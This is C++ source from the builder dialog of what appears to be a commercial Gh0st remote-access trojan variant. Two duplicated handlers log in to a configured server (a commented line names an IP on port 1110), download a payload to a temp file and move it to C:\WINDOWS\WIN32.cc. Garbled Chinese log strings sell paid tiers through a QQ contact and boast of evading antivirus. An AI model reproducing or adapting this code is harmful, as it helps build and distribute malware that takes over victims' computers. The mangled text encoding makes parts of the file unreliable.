        m_log.ReplaceSel("=> ��ʯ��˵����\r\n=> �� ��ʯ�û���������ע�������з���\r\n=> �� ��������ʯר�������ܼ��ɱ�����Ҷ��ɱ������ʾ�������ߡ�\r\n");
        m_log.ReplaceSel("=> �� ��������һ������һ�ε���ɱ���·���...\r\n=> �� ��Զ�ؼ����������ʱ��ϵ����Ա������Ա�ṩVIP����\r\n");
        m_log.ReplaceSel("=> �� ��ӵ������С��Դ�룬���ɻ�ô���Զ�ص��ʸ�...\r\n");
        m_log.ReplaceSel("=> ��ͨ��ʯ�����RMB��500Ԫ/�£�Ψһ�ͷ�QQ��826338442...\r\n");
        m_zs_build.EnableWindow(FALSE);
    }


    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
    DeleteFile("C:\\WINDOWS\\WIN32.cc");
    char zhanghao[50];
    char mima[50];
    CString pass = m_inifile.GetString( "UPDATE", "Dns2", "" );
    CString user = m_inifile.GetString( "UPDATE", "Dns1", "" );
    if ( pass.GetLength() != 0 ) {
        strcpy( mima,NewDecode((char *)pass.GetBuffer(0)));
    }
    if ( user.GetLength() != 0 ) {
        strcpy( zhanghao,NewDecode((char *)user.GetBuffer(0)));
    }
// 	GetDlgItemText(IDC_USER,zhanghao,sizeof(zhanghao));
// 	GetDlgItemText(IDC_PASS,mima,sizeof(mima));
// 	if (strcmp(zhanghao,"")==0||strcmp(mima,"")==0)
// 	{
// 		MessageBox("����дVip�˺�\\Vip����","����",NULL);
// 	    return;
// 	}
    // TODO: Add your control notification handler code here
    char TmpPath[MAX_PATH];
    GetTempPath( sizeof(TmpPath), TmpPath );
    lstrcatA( TmpPath, "\\WindsTemp.exe" );
    DeleteFile(TmpPath);
    DWORD recvsize = 0;
    SOCKET sockInt;
    struct sockaddr_in serverAddr;
    //struct hostent *hp;
    WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
    //����SOCK
    sockInt = socket(AF_INET, SOCK_STREAM, 0);
    if(sockInt == INVALID_SOCKET) {
        AfxMessageBox("socket error!\n");
        WSACleanup();
        return;
    }

    //��ȡ������IP�Ͷ˿�
    serverAddr.sin_family = AF_INET;
    char tgtIP[30] = {0};
    struct hostent *hp = NULL;
//	m_inifile.SetString( "HOSTNAME", "hostname",(char *)m_hostname.GetBuffer(0));
    CString MyHostName = m_inifile.GetString( "HOSTNAME", "hostname", "" );
    char hostname[50];
    if ( MyHostName.GetLength() != 0 ) {
        strcpy( hostname,NewDecode((char *)MyHostName.GetBuffer(0)));
    }
//	if ((hp = gethostbyname("182.92.102.86")) != NULL)
    if ((hp = gethostbyname(hostname)) != NULL) {
        in_addr in;
        memcpy(&in, hp->h_addr, hp->h_length);
        lstrcpy(tgtIP,inet_ntoa(in));
    }

    serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
    serverAddr.sin_port = htons(1110);

    //���ӷ���
    if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        AfxMessageBox("���ӷ�����ʧ��!\n");
        WSACleanup();
        return;
    }
    char USERIMFOR[256] = {0}, buff[256] = {0};
    wsprintf( USERIMFOR, "Login:%s@%s",zhanghao,mima);

    if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR ) {
        AfxMessageBox("��������ʧ��!\n");
        WSACleanup();
        return;
    }

    int Ret = recv( sockInt, buff, sizeof(buff), NULL );
    if ( Ret == 0 || Ret == SOCKET_ERROR ) {
        AfxMessageBox("��ȡ����ʧ��");
        WSACleanup();
        return;
    }
    if ( strstr( buff, "Pass" ) != NULL ) { //ͨ����֤
        if ( GetFileAttributes(TmpPath) != -1 ) {
            AfxMessageBox("File is exist and can't delete!");
            WSACleanup();
            return;
        }

        NET_DATA MyData;
        DWORD dwBytes;
        HANDLE hFile = CreateFile( TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
        BYTE request[256] = {0};
        request[0] = Request_DOWN;
        char *laji = "48f9648";

        if ( mima != 0 ) {
            lstrcpy( (char*)&request[1],mima );
        }
        send( sockInt, (char*)&request, sizeof(request), NULL );
        while (1) {
            memset( &MyData, 0, sizeof(NET_DATA) );
            Ret = recv( sockInt, (char*)&MyData, sizeof(MyData), NULL );
            if ( Ret == 0 || Ret == SOCKET_ERROR ) {
                AfxMessageBox("��ȡ�ļ�����!");
                CloseHandle(hFile);
                WSACleanup();
                return;
            }
            if ( MyData.Flags != File_Buffer_Finish && MyData.Flags != File_Buffer ) break;
            strInfo = MyData.Info;
            WriteFile(hFile, MyData.Buffer, MyData.Buffer_Size, &dwBytes, NULL);
            recvsize += MyData.Buffer_Size;
            send( sockInt, laji, lstrlen(laji) + 1, NULL );
            if ( MyData.Flags == File_Buffer_Finish ) break;
        }
        CloseHandle(hFile);
    } else {
        WSACleanup();
        return;
    }
    //�ر�SOCK
    closesocket(sockInt);
    WSACleanup();
    MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");

//	SetDlgItemText(IDC_EDIT_HOST,strInfo);
//	GetDlgItem(IDOK)->EnableWindow(TRUE);
    GetDlgItem(IDC_HUOQU_ZP)->EnableWindow(FALSE);
    Sleep(3000);
    m_zs_build.EnableWindow(TRUE);
}

void CBuild::OnHuoquCp() //��ȡע������
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
    CString struser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString( "UPDATE", "Dns1", "" );

    if ( struser.GetLength() != NULL ) {
        m_zc_build.EnableWindow(TRUE);
    } else {
// 		if (MessageBox("��Ѳ��԰治��ʹ��������������������ϵ����Ա���¼�ٷ�QQȺ��ͨ���߰汾��/nע���˵����/n���û���������ʹ��Զ�ؿ��ƣ������й��ܲ������ơ�/n��������ר���Ĳ���ϵͳ���̷����������ŵ��������Լ�ǿ��", "����", MB_OK) == IDOK)
// 		{
// 			m_zc_build.EnableWindow(FALSE);
// 		}
        m_log.ReplaceSel("=> ��Ѳ��԰治��ʹ�á�ע���ͨ����...\r\n=> ����ϵ����Ա���¼�ٷ�QQȺ��ͨ���߰汾��\r\n");
        m_log.ReplaceSel("=> ע���˵����\r\n=> �� ע���û���������ʹ��Զ�ؿ��ƣ������й��ܲ������ơ�\r\n=> �� ������Gh0st����Ĳ���ϵͳ���̷����������ŵ��������Լ�ǿ���޶������̣����ױ����֣���������ʸߡ�\r\n");
        m_log.ReplaceSel("=> �� ��������һ����һ�ε���ɱ���·���...\r\n=> �� ���������ʱ��ϵ����Ա������Ա�ṩ���ɷ���\r\n");
        m_log.ReplaceSel("=> ��ͨע������RMB��100Ԫ��Ψһ�ͷ�QQ��826338442\r\n");
        m_zc_build.EnableWindow(FALSE);
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////
    DeleteFile("C:\\WINDOWS\\WIN32.cc");
    char zhanghao[50];
    char mima[50];
    CString pass = m_inifile.GetString( "UPDATE", "Dns2", "" );
    CString user = m_inifile.GetString( "UPDATE", "Dns1", "" );
    if ( pass.GetLength() != 0 ) {
        strcpy( mima,NewDecode((char *)pass.GetBuffer(0)));
    }
    if ( user.GetLength() != 0 ) {
        strcpy( zhanghao,NewDecode((char *)user.GetBuffer(0)));
    }
// 	GetDlgItemText(IDC_USER,zhanghao,sizeof(zhanghao));
// 	GetDlgItemText(IDC_PASS,mima,sizeof(mima));
// 	if (strcmp(zhanghao,"")==0||strcmp(mima,"")==0)
// 	{
// 		MessageBox("����дVip�˺�\\Vip����","����",NULL);
// 	    return;
// 	}
    // TODO: Add your control notification handler code here
    char TmpPath[MAX_PATH];
    GetTempPath( sizeof(TmpPath), TmpPath );
    lstrcatA( TmpPath, "\\WindsTemp.exe" );
    DeleteFile(TmpPath);
    DWORD recvsize = 0;
    SOCKET sockInt;
    struct sockaddr_in serverAddr;
    //struct hostent *hp;
    WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
    //����SOCK
    sockInt = socket(AF_INET, SOCK_STREAM, 0);
    if(sockInt == INVALID_SOCKET) {
        AfxMessageBox("socket error!\n");
        WSACleanup();
        return;
    }

    //��ȡ������IP�Ͷ˿�
    serverAddr.sin_family = AF_INET;
    char tgtIP[30] = {0};
    struct hostent *hp = NULL;
//	m_inifile.SetString( "HOSTNAME", "hostname",(char *)m_hostname.GetBuffer(0));
    CString MyHostName = m_inifile.GetString( "HOSTNAME", "hostname", "" );
    char hostname[50];
    if ( MyHostName.GetLength() != 0 ) {
        strcpy( hostname,NewDecode((char *)MyHostName.GetBuffer(0)));
    }
//	if ((hp = gethostbyname("182.92.102.86")) != NULL)
    if ((hp = gethostbyname(hostname)) != NULL) {
        in_addr in;
        memcpy(&in, hp->h_addr, hp->h_length);
        lstrcpy(tgtIP,inet_ntoa(in));
    }

    serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
    serverAddr.sin_port = htons(1110);

    //���ӷ���
    if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        AfxMessageBox("���ӷ�����ʧ��!\n");
        WSACleanup();
        return;
    }
    char USERIMFOR[256] = {0}, buff[256] = {0};
    wsprintf( USERIMFOR, "Login:%s@%s",zhanghao,mima);

    if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR ) {
        AfxMessageBox("��������ʧ��!\n");
        WSACleanup();
        return;
    }

    int Ret = recv( sockInt, buff, sizeof(buff), NULL );
    if ( Ret == 0 || Ret == SOCKET_ERROR ) {
        AfxMessageBox("��ȡ����ʧ��");
        WSACleanup();
        return;
    }
    if ( strstr( buff, "Pass" ) != NULL ) { //ͨ����֤
        if ( GetFileAttributes(TmpPath) != -1 ) {
            AfxMessageBox("File is exist and can't delete!");
            WSACleanup();
            return;
        }

        NET_DATA MyData;
        DWORD dwBytes;
        HANDLE hFile = CreateFile( TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
        BYTE request[256] = {0};
        request[0] = Request_DOWN;
        char *laji = "48f9648";

        if ( mima != 0 ) {
            lstrcpy( (char*)&request[1],mima );
        }
        send( sockInt, (char*)&request, sizeof(request), NULL );
        while (1) {
            memset( &MyData, 0, sizeof(NET_DATA) );
            Ret = recv( sockInt, (char*)&MyData, sizeof(MyData), NULL );
            if ( Ret == 0 || Ret == SOCKET_ERROR ) {
                AfxMessageBox("��ȡ�ļ�����!");
                CloseHandle(hFile);
                WSACleanup();
                return;
            }
            if ( MyData.Flags != File_Buffer_Finish && MyData.Flags != File_Buffer ) break;
            strInfo = MyData.Info;
            WriteFile(hFile, MyData.Buffer, MyData.Buffer_Size, &dwBytes, NULL);
            recvsize += MyData.Buffer_Size;
            send( sockInt, laji, lstrlen(laji) + 1, NULL );
            if ( MyData.Flags == File_Buffer_Finish ) break;
        }
        CloseHandle(hFile);
    } else {
        WSACleanup();
        return;
    }
    //�ر�SOCK
    closesocket(sockInt);
    WSACleanup();
    MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");

//	SetDlgItemText(IDC_EDIT_HOST,strInfo);
//	GetDlgItem(IDOK)->EnableWindow(TRUE);
    GetDlgItem(IDC_HUOQU_CP)->EnableWindow(FALSE);

    m_zc_build.EnableWindow(TRUE);
}

void CBuild::OnZsBuild() //��ʯ����
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
}

void CBuild::OnZcBuild() //ע������
{
    // TODO: Add your control notification handler code here
    UpdateData(true);
}
